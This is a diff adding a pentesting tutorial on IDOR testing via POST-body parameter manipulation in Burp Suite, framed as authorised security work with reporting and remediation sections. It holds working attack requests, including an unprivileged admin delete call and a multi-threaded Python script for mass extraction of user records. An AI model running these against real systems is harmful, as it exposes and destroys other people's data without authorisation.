@@ -9143,3 +9143,600 @@ def get_file(file_id):
 
 ---
 
+# 📍 **IDOR Technique #18: POST Body Parameter Manipulation - Complete Burp Suite Methodology**
+
+## 🎯 **Technique Overview**
+**Moving ID parameters from URL to POST body** - Testing for inconsistent authorization checks when parameters are moved to different locations.
+
+---
+
+## 🔍 **UNDERSTANDING THE VULNERABILITY**
+
+### **Why This Works**
+- Applications often validate authorization for obvious parameters (URL) but overlook hidden ones (POST body)
+- Developers may trust POST body parameters more than URL parameters
+- Different code paths might handle the same parameter differently
+
+### **Common Scenarios**
+```http
+# Original Request (GET)
+GET /api/user/profile?id=100 HTTP/1.1
+
+# Vulnerable Pattern (POST)
+POST /api/user/profile HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+id=101
+```
+
+---
+
+## 📊 **PHASE 1: RECONNAISSANCE & MAPPING**
+
+### **Step 1: Spider the Application**
+1. **Configure Burp Spider**:
+   ```
+   Target → Site Map → Right-click → Spider this host
+   ```
+
+2. **Passive Crawling**:
+   ```
+   Proxy → Options → Passive Crawling → Enable
+   ```
+
+3. **Record All Endpoints with IDs**:
+   - Create a spreadsheet/notepad
+   - Document each endpoint with ID parameters
+   - Note the HTTP method used
+
+### **Step 2: Identify Potential Targets**
+Look for these patterns:
+
+```http
+# Pattern 1: GET requests with IDs in URL
+GET /api/orders/ORD-2024-001
+GET /profile?user_id=123
+GET /download?file_id=456
+
+# Pattern 2: POST requests with IDs in URL
+POST /api/user/100/update
+POST /admin/delete/789
+
+# Pattern 3: RESTful endpoints
+GET /api/v1/users/100
+DELETE /api/v1/posts/200
+```
+
+### **Step 3: Create Target List**
+```
+Target List Template:
+├── GET /api/users/[ID]
+├── GET /profile?user_id=[ID]
+├── POST /api/orders/[ID]/cancel
+├── DELETE /api/comments/[ID]
+├── PUT /api/profile/[ID]/update
+└── GET /download?file=[ID]
+```
+
+---
+
+## 🛠️ **PHASE 2: BURP CONFIGURATION**
+
+### **Step 1: Set Up Project Options**
+```
+Project Options → Connections → Platform Authentication
+- Add any required authentication
+
+Project Options → HTTP
+- Enable "Redirections" → "Always"
+- Set "Streaming responses" → On
+```
+
+### **Step 2: Configure Scope**
+```
+Target → Scope → Include in Scope
+- Add all target domains
+- Use "Advanced Scope Control" for precise targeting
+
+Exclude from Scope:
+- Logout endpoints
+- Static resources (.js, .css, .png)
+- Third-party domains
+```
+
+### **Step 3: Set Up Session Handling**
+```
+Project Options → Sessions
+1. Add "Cookie Jar" → Use cookies from Proxy
+2. Add "Session Handling Rules":
+   - Check session validity
+   - Auto-reauthentication
+   - Macro for login if needed
+```
+
+---
+
+## 🔬 **PHASE 3: BASIC TESTING METHODOLOGY**
+
+### **Step 1: Baseline Request Capture**
+
+1. **Intercept legitimate request**:
+```http
+GET /api/user/profile?id=100 HTTP/1.1
+Host: target.com
+Cookie: session=abc123
+User-Agent: Mozilla/5.0
+```
+
+2. **Send to Repeater**: `Ctrl+R`
+
+3. **Document baseline response**:
+   - Status code: 200
+   - Content length: 2450
+   - Response time: 150ms
+   - Contains: user data for ID 100
+
+### **Step 2: Parameter Location Testing**
+
+**Test Case A: Move GET parameter to POST body**
+
+```http
+# Original
+GET /api/user/profile?id=100 HTTP/1.1
+
+# Test 1 - POST with body
+POST /api/user/profile HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 7
+
+id=101
+
+# Test 2 - POST with JSON body
+POST /api/user/profile HTTP/1.1
+Content-Type: application/json
+Content-Length: 15
+
+{"id":101}
+```
+
+**Test Case B: Move URL path parameter to body**
+
+```http
+# Original
+GET /api/user/100/profile HTTP/1.1
+
+# Test - Move to body
+POST /api/user/profile HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+user_id=101
+```
+
+### **Step 3: Systematic Testing Matrix**
+
+Create a testing matrix in Burp Intruder:
+
+**Payload Positions:**
+```
+Original: /api/user/profile?id=§100§
+Test 1: POST /api/user/profile | body: id=§101§
+Test 2: POST /api/user/profile | body: {"id":§101§}
+Test 3: PUT /api/user/profile | body: id=§101§
+Test 4: PATCH /api/user/profile | body: id=§101§
+```
+
+---
+
+## 🎯 **PHASE 4: ADVANCED BURP TECHNIQUES**
+
+### **Technique 1: Burp Intruder Attack**
+
+**Setup:**
+```
+Target: /api/user/profile
+Positions: Add to body
+Payload: Numbers 1-200 (or relevant ID range)
+
+Attack Types:
+1. Sniper - Single payload
+2. Pitchfork - Multiple payload sets
+3. Cluster bomb - Combinations
+```
+
+**Payload Processing Rules:**
+```python
+# Add payload processing
+Payload Processing → Add:
+1. Hash: SHA-256 (if IDs are hashed)
+2. Base64-encode (if encoded)
+3. Add prefix/suffix (if needed)
+```
+
+### **Technique 2: Burp Comparer Analysis**
+
+**Process:**
+1. Collect responses for different IDs
+2. Send to Comparer
+3. Look for:
+   - Identical responses (possible authorization failure)
+   - Slightly different responses (partial data leak)
+   - Error messages (information disclosure)
+
+### **Technique 3: Burp Sequencer**
+For predictable ID patterns:
+
+```
+Sequencer → Live Capture
+- Capture ID generation
+- Analyze randomness
+- Predict next valid IDs
+```
+
+---
+
+## 🔄 **PHASE 5: VARIATION TESTING**
+
+### **Test 1: Content-Type Variations**
+
+```http
+# URL-encoded
+POST /api/user/data HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+id=101
+
+# Multipart
+POST /api/user/data HTTP/1.1
+Content-Type: multipart/form-data; boundary=123
+--123
+Content-Disposition: form-data; name="id"
+101
+--123--
+
+# JSON
+POST /api/user/data HTTP/1.1
+Content-Type: application/json
+{"id":101}
+
+# XML
+POST /api/user/data HTTP/1.1
+Content-Type: application/xml
+<id>101</id>
+
+# Plain text
+POST /api/user/data HTTP/1.1
+Content-Type: text/plain
+101
+```
+
+### **Test 2: Parameter Name Variations**
+
+```http
+id=101
+user_id=101
+userId=101
+UID=101
+account=101
+profile=101
+document=101
+file=101
+order=101
+```
+
+### **Test 3: Nesting Variations**
+
+```http
+# Simple
+{"id":101}
+
+# Nested object
+{"user":{"id":101}}
+
+# Array
+{"ids":[101]}
+
+# Array of objects
+{"users":[{"id":101}]}
+```
+
+---
+
+## 🤖 **PHASE 6: AUTOMATED TESTING WITH BURP EXTENSIONS**
+
+### **Recommended Extensions**
+
+1. **Autorize** - Automate authorization tests
+```
+Extender → BApp Store → Install Autorize
+Configuration:
+- Low privilege session
+- High privilege session
+- Auto-run on all requests
+```
+
+2. **AuthMatrix** - Matrix-based testing
+```
+Configure roles and requests
+Test all combinations automatically
+Generate detailed reports
+```
+
+3. **JSON Web Tokens** - For JWT-based auth
+```
+Decode JWT tokens
+Modify claims
+Test signature validation
+```
+
+### **Custom Extension Script (Python)**
+
+```python
+from burp import IBurpExtender, IScannerCheck
+from java.util import ArrayList
+import re
+
+class BurpExtender(IBurpExtender, IScannerCheck):
+    
+    def registerExtenderCallbacks(self, callbacks):
+        self._callbacks = callbacks
+        self._helpers = callbacks.getHelpers()
+        callbacks.setExtensionName("IDOR POST Body Tester")
+        callbacks.registerScannerCheck(self)
+        
+    def doPassiveScan(self, baseRequestResponse):
+        # Analyze requests with IDs in URL
+        analysis = self._helpers.analyzeRequest(baseRequestResponse)
+        url = analysis.getUrl()
+        
+        # Check if URL contains ID pattern
+        if re.search(r'/\d+', url.getPath()):
+            return self.testIDOR(baseRequestResponse)
+        return None
+    
+    def testIDOR(self, baseRequestResponse):
+        # Create test cases
+        testCases = []
+        
+        # Move ID from URL to POST body
+        modified = self.moveToBody(baseRequestResponse)
+        testCases.append(modified)
+        
+        return testCases if testCases else None
+```
+
+---
+
+## 📝 **PHASE 7: MANUAL VALIDATION**
+
+### **Validation Checklist**
+
+For each potential finding:
+
+- [ ] **Authentication**: Session is valid and belongs to attacker
+- [ ] **Authorization**: Attacker shouldn't have access to target resource
+- [ ] **Data Sensitivity**: What data was exposed?
+- [ ] **Response Consistency**: Can you reproduce?
+- [ ] **Different User**: Test with multiple victim accounts
+- [ ] **Different Endpoints**: Test similar endpoints
+
+### **Proof of Concept Documentation**
+
+```markdown
+# IDOR Vulnerability Report
+
+## Vulnerability Type
+IDOR via POST Body Parameter Manipulation
+
+## Endpoint
+POST /api/user/profile
+
+## Original Request (Legitimate)
+GET /api/user/profile?id=100
+
+## Malicious Request
+POST /api/user/profile HTTP/1.1
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+Cookie: session=attacker_session
+
+id=101
+
+## Response
+[Paste sensitive data here]
+
+## Impact
+Access to other users' profile data including:
+- Full name
+- Email address
+- Payment methods
+- Order history
+
+## Steps to Reproduce
+1. Log in as attacker user
+2. Capture legitimate request to /api/user/profile?id=100
+3. Change method to POST
+4. Move ID parameter to body
+5. Change ID value to 101
+6. Observe unauthorized access
+```
+
+---
+
+## 🎯 **PHASE 8: EXPLOITATION SCENARIOS**
+
+### **Scenario 1: Profile Data Access**
+
+```http
+# Step 1: Get your own profile
+POST /api/profile HTTP/1.1
+Cookie: session=abc123
+
+{"action":"view", "user_id":100}
+
+# Step 2: Try victim's ID
+POST /api/profile HTTP/1.1
+Cookie: session=abc123
+
+{"action":"view", "user_id":101}
+
+# Step 3: Check response for victim's data
+HTTP/1.1 200 OK
+{
+  "user_id": 101,
+  "email": "victim@email.com",
+  "ssn": "123-45-6789",
+  "payment_methods": [...]
+}
+```
+
+### **Scenario 2: Function-Based Access**
+
+```http
+# Admin function with ID in URL
+GET /admin/deleteUser?user_id=100
+
+# Test as regular user
+POST /admin/deleteUser HTTP/1.1
+Cookie: session=user_session
+
+user_id=101
+```
+
+### **Scenario 3: Mass Data Extraction**
+
+```python
+import requests
+import threading
+
+def extract_user_data(user_id):
+    payload = {"user_id": user_id}
+    response = requests.post(
+        "https://target.com/api/profile",
+        json=payload,
+        cookies={"session": "attacker_session"}
+    )
+    if response.status_code == 200:
+        save_data(user_id, response.json())
+
+# Multi-threaded extraction
+for user_id in range(1, 1000):
+    thread = threading.Thread(target=extract_user_data, args=(user_id,))
+    thread.start()
+```
+
+---
+
+## 🛡️ **PHASE 9: REPORTING**
+
+### **Report Template Sections**
+
+1. **Executive Summary**
+   - Brief description of vulnerability
+   - Business impact
+   - Risk rating
+
+2. **Technical Details**
+   - Vulnerable endpoints
+   - Request/response examples
+   - Authentication context
+
+3. **Proof of Concept**
+   - Step-by-step reproduction
+   - Screenshots
+   - Burp project file
+
+4. **Impact Analysis**
+   - Data exposed
+   - Potential attack chains
+   - Business risks
+
+5. **Remediation Recommendations**
+   - Immediate fixes
+   - Long-term solutions
+   - Code examples
+
+### **Risk Rating Matrix**
+
+| Factor | Rating | Score |
+|--------|--------|-------|
+| Exploitability | Easy | 3/3 |
+| Prevalence | Common | 2/3 |
+| Detectability | Medium | 2/3 |
+| Technical Impact | High | 3/3 |
+| Business Impact | High | 3/3 |
+| **Overall** | **Critical** | **13/15** |
+
+---
+
+## 🔧 **PHASE 10: REMEDIATION TESTING**
+
+### **Verify Fixes**
+
+After fixes are implemented, retest:
+
+```http
+# Test 1: Original vulnerability
+POST /api/profile HTTP/1.1
+Cookie: session=attacker
+
+id=101
+
+# Should return 403 Forbidden
+
+# Test 2: Parameter pollution
+POST /api/profile?user_id=100 HTTP/1.1
+Cookie: session=attacker
+
+user_id=101
+
+# Should validate both locations
+
+# Test 3: Different formats
+POST /api/profile HTTP/1.1
+Content-Type: application/json
+Cookie: session=attacker
+
+{"user_id":101}
+
+# Should properly authorize
+```
+
+---
+
+## 📚 **ADDITIONAL RESOURCES**
+
+### **Burp Suite Pro Tips**
+- Use "Session Handling Rules" for complex authentication
+- Create "Macros" for multi-step processes
+- Utilize "Extensions" for automated testing
+- Save "Configurations" for future tests
+
+### **Common Pitfalls to Avoid**
+- Don't test on production without permission
+- Avoid rate limiting triggers
+- Don't modify other users' data
+- Document everything
+- Stop if you find sensitive data
+
+### **Practice Labs**
+- PortSwigger Web Security Academy: IDOR labs
+- PentesterLab: IDOR challenges
+- HackTheBox: Machines with IDOR
+- TryHackMe: IDOR rooms
+
+---
+
+## ✅ **FINAL CHECKLIST**
+
+- [ ] Completed reconnaissance phase
+- [ ] Configured Burp properly
+- [ ] Tested all identified endpoints
+- [ ] Tried all parameter locations
+- [ ] Validated findings manually
+- [ ] Documented PoC
+- [ ] Assessed business impact
+- [ ] Created comprehensive report
+- [ ] Tested remediation
+- [ ] Followed disclosure process
+
+---
+
